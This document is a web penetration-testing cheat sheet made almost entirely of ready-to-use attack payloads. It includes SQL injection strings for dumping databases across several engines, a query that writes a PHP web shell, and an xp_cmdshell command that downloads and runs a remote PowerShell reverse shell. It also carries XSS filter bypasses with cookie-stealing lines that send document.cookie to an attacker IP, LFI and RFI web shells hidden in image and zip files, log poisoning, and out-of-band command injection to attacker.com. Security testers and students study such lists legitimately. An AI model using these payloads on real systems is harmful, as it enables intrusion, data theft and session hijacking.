# 🌐 Web Pentesting 

> **GitHub‑ready notes** for Web Application Penetration Testing (SQLi, XSS, LFI, RFI, IDOR, Command Injection & more)

---

## SQL Injection (SQLi)

### MySQL / MariaDB

#### 🔓 Authentication Bypass

```sql
' or 1=1 -- -
admin' -- -
' or 1=1 order by 2 -- -
' or 1=1 order by 1 desc -- -
' or 1=1 limit 1,1 -- -
```

#### 📊 Get Number of Columns

```sql
-1 order by 3;#
```

#### 🧾 Get Version

```sql
-1 union select 1,2,version();#
```

#### 🗄️ Get Database Name

```sql
-1 union select 1,2,database();#
```

#### 📁 Get Table Names

```sql
-1 union select 1,2,group_concat(table_name)
from information_schema.tables
where table_schema="<database_name>";#
```

#### 🧩 Get Column Names

```sql
-1 union select 1,2,group_concat(column_name)
from information_schema.columns
where table_schema="<database_name>"
and table_name="<table_name>";#
```

#### 📤 Dump Data

```sql
-1 union select 1,2,group_concat(<column_names>) from <database>.<table>;#
```

---

### Webshell via SQLi (MySQL)

#### 📂 Read Web Server Config

```sql
LOAD_FILE('/etc/httpd/conf/httpd.conf')
```

#### 🐚 Write Webshell

```sql
select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
```

#### 📄 Read Files

```sql
SELECT LOAD_FILE('/etc/passwd');
```

---

### Oracle SQL Injection

#### 🔓 Auth Bypass

```sql
' or 1=1--
```

#### 📊 Column Count

```sql
' order by 3--
```

#### 📁 Tables

```sql
' union select null,table_name,null from all_tables--
```

#### 🧩 Columns

```sql
' union select null,column_name,null from all_tab_columns where table_name='<table>'--
```

#### 📤 Dump

```sql
' union select null,PASSWORD||USER_ID||USER_NAME,null from WEB_USERS--
```

---

### SQLite Injection

#### 📁 Tables (Exclude sqlite internal)

```sql
?id=-1 union select 1,2,3,group_concat(tbl_name),4
FROM sqlite_master
WHERE type='table' and tbl_name NOT like 'sqlite_%'--
```

#### 📤 Dump Users

```sql
?id=-1 union select 1,2,3,group_concat(password),5 from users--
```

📘 Reference: [https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf](https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf)

---

### MSSQL Injection

#### 🔓 Auth Bypass

```sql
' or 1=1--
```

#### ⏱️ Version + Delay

```sql
' SELECT @@version; WAITFOR DELAY '00:00:10';--
```

#### ⚙️ Enable xp_cmdshell

```sql
' UNION SELECT 1,null;
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
```

#### 💥 RCE

```sql
' exec xp_cmdshell "powershell IEX (New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-PowerShellTcp.ps1')";--
```

Repo: [https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

---

## Cross‑Site Scripting (XSS)

### Methodology

1. Identify language / framework
2. Find input points
3. Check reflection in response
4. Test allowed characters: `< > ' " { } ;`
5. Bypass filters

---

### XSS Filter Bypass Examples

#### Event Handler Regex Bypass

```html
<svg onload%09=alert(1)>
<svg %09onload%20=alert(1)>
```

#### Keyword Filter Bypass

```html
<script>\u0061lert(1)</script>
<script>eval("\u0061lert(1)")</script>
```

#### Script Tag Removal Bypass

```html
<sCR<script>iPt>alert(1)</SCr</script>IPt>
```

---

### Encoding Techniques

#### Unicode

```html
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
```

#### Octal / Hex / Mixed

```html
<img src=x onerror="eval('\141lert(1)')">
<img src=x onerror="setInterval('\\x61lert(1)')">
```

Encoders:

* [https://checkserp.com/encode/unicode/](https://checkserp.com/encode/unicode/)
* [http://www.unit-conversion.info/texttools/octal/](http://www.unit-conversion.info/texttools/octal/)
* [http://www.unit-conversion.info/texttools/hexadecimal/](http://www.unit-conversion.info/texttools/hexadecimal/)

---

### XSS → Session Hijacking

```html
<script>new Image().src="http://<IP>/?c="+document.cookie;</script>
<script>fetch('http://<IP>/?c='+btoa(document.cookie));</script>
```

---

## Broken Access Control / IDOR

### Techniques

* Compare IDs across users
* Change HTTP methods
* API versioning: `/api/v1/`, `/api/v2/`
* Try wildcard `*`
* Predictable ID bruteforce

#### Parameter Pollution

```http
GET /api?id=1&id=2
GET /api?id[]=1&id[]=2
```

#### JSON Pollution

```json
{"user_id":1,"user_id":2}
{"user_id":{"user_id":2}}
```

---

## Local File Inclusion (LFI)

### Traversal Bypass

```text
/....//....//etc/passwd
..././..././etc/passwd
```

### URL Encode / Double Encode

```text
%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252fetc%252fpasswd
```

### PHP Wrappers

```text
php://filter/read=convert.base64-encode/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=
expect://id
```

---

### LFI + Upload

#### GIF

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

#### ZIP

```bash
echo '<?php system($_GET["cmd"]); ?>' > ok.php
zip shell.jpg ok.php
```

```text
zip://uploads/shell.jpg#ok.php
```

---

### Log Poisoning

#### Apache

```bash
curl -A '<?php system($_GET["cmd"]); ?>' http://ip/
```

```text
/var/log/apache2/access.log
```

---

## Remote File Inclusion (RFI)

```bash
echo '<?php system($_GET["cmd"]); ?>' > evil.txt
python -m http.server 80
```

```text
?file=http://<IP>/evil.txt&cmd=id
```

---

## OS Command Injection

### Operators

```text
; && | || ` $( ) %0A
```

### OOB

```bash
curl http://$(whoami).attacker.com/
nslookup `whoami`.attacker.com
```

---

## Shellshock

```bash
curl -A "() { :; }; /bin/bash -c 'id'" http://<IP>
```

---

## WebDAV

```bash
cadaver http://<IP>/webdav
put shell.asp
```

Repo: [https://github.com/notroj/cadaver](https://github.com/notroj/cadaver)

---

## Wordlists & Templates

* SecLists: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
* XSS Nuclei: [https://raw.githubusercontent.com/esetal/nuclei-bb-templates/master/xss-fuzz.yaml](https://raw.githubusercontent.com/esetal/nuclei-bb-templates/master/xss-fuzz.yaml)
* LFI Nuclei: [https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/fuzzing/linux-lfi-fuzzing.yaml](https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/fuzzing/linux-lfi-fuzzing.yaml)

---

✅ **End of Web Pentesting Cheat Sheet**
